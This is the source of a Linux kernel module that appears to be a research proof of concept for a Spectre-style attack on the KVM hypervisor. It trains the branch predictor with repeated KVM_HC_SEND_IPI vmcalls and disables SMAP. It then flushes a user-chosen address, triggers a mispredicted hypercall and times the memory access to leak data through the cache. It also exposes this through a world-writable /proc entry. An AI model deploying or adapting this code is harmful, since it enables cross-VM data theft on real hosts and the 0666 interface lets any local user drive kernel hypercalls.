// You can only do hypercalls from ring 0, so this has to be a kernel module
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/types.h>

#include <linux/kvm_para.h>

#include "cache_eviction.h"
#include "hypercall.h"
#include "linux/gfp_types.h"
#include "timing.h"

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_send_ipi;

static inline __attribute__((always_inline)) void disable_smap(void) { __asm__ volatile("stac" ::: "cc"); }
static inline __attribute__((always_inline)) void enable_smap(void) { __asm__ volatile("clac" ::: "cc"); }

static inline __attribute__((always_inline)) void confuse_branch_predictor(void) {
  // Bring the branch predictor into a known state of history
  asm volatile("movq $0, %%rcx\n"
               "cmpq $0, %%rcx\n"
               ".rept 300\n" // TODO: optimize this, maybe 300 is too much/too little?
               "je 1f\n"
               "1:\n"
               ".endr\n" ::
                   : "rcx", "cc");
}

static noinline void vmcall(int hypercall_number, unsigned long rbx, unsigned long rcx, unsigned long rdx,
                            unsigned long rsi) {
  confuse_branch_predictor();
  asm volatile("vmcall" : "+a"(hypercall_number), "+b"(rbx), "+c"(rcx), "+d"(rdx), "+S"(rsi));
}

static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
  struct send_ipi_hypercall opts;

  // Make sure that only the size of the struct is written
  if (len != sizeof(opts)) {
    return -EINVAL;
  }

  // Copy the buffer from the user
  if (copy_from_user(&opts, buff, sizeof(opts))) {
    return -EFAULT;
  }

  int type = KVM_HC_SEND_IPI;

  // Take the correct branch twice, so the 2-bit saturating counter from the branch predictor
  // will be at least in the weakly taken/strongly taken state
  //
  //                    taken           taken        taken
  //       ┌─►┌─────────┬────►┌─────────┬────►┌──────┬────►┌────────┬──┐
  //   not │  │strongly │     │ weakly  │     │weakly│     │strongly│  │taken
  //  taken│  │not taken│     │not taken│     │taken │     │ taken  │  │
  //       └──┴─────────┘◄────┴─────────┘◄────┴──────┘◄────┴────────┘◄─┘
  //                      not             not          not
  //                     taken           taken        taken
  //
  vmcall(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);
  vmcall(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);

  // Do the mispredicted vmcall!
  disable_smap();
  __asm__ volatile("clflush (%0)\nmfence" ::"r"(opts.ptr));
  enable_smap();

  vmcall(type, opts.mispredicted.mask_low, opts.mispredicted.mask_high, opts.mispredicted.min,
         opts.mispredicted.icr.raw_icr);

  disable_smap();
  size_t time = access_time(opts.ptr);
  enable_smap();

  return time;
}

static const struct proc_ops send_ipi_fops = {
    .proc_write = send_ipi_write,
};

static int __init hypercall_main(void) {
  const char *procfs_root_name = "hypercall";
  const char *procfs_ipi_name = "send_ipi";

  // Initialize the root procfs entry
  proc_root = proc_mkdir(procfs_root_name, NULL);
  if (!proc_root) {
    proc_remove(proc_root);
    pr_alert("hypercall: Error: Could not initialize /proc/%s\n", procfs_root_name);
    return -ENOMEM;
  }

  // Initialize the send_ipi entry
  proc_send_ipi = proc_create(procfs_ipi_name, 0666, proc_root, &send_ipi_fops);
  if (!proc_send_ipi) {
    proc_remove(proc_send_ipi);
    proc_remove(proc_root);
    pr_alert("hypercall: Error:Could not initialize /proc/%s/%s\n", procfs_root_name, procfs_ipi_name);
    return -ENOMEM;
  }

  pr_info("hypercall: procfs entries created\n");

  return 0;
}

static void __exit hypercall_exit(void) {
  proc_remove(proc_send_ipi);
  proc_remove(proc_root);
  pr_info("hypercall: procfs entries removed\n");
}

module_init(hypercall_main);
module_exit(hypercall_exit);
MODULE_LICENSE("GPL");
